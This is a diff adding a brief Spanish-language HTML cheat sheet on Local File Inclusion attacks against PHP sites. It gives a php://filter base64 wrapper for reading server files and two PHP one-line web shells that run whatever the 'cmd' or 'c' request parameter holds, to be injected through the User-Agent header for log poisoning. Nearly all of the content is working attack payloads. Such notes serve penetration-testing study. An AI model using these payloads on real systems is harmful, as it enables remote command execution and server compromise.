@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Local File Inclusion</title>
+</head>
+<body>
+  <h1>Local File Inclusion (LFI)</h1>
+  <ul>
+    <li>
+      <h2>Filtros</h2>
+      <p>En algunas ocasiones se pueden ver los filtros para inclusión de archivos locales.</p>
+      <ul>
+        <li>SEE FILTER: view=php://filter/convert.base64-encode/resource=file:///</li>
+        <li>USER AGENT: <pre><code>&lt;?php echo system($_GET['cmd']); ?&gt;</code></pre>
+          <pre><code>&lt;?php system($_GET['c']); ?&gt;</code></pre>
+ (con el primero se pone el comando a ejecutar sin mas, con el segundo se pone &c=comando)</p></li>
+      </ul>
+    </li>
+  </ul>
+</body>
+</html>
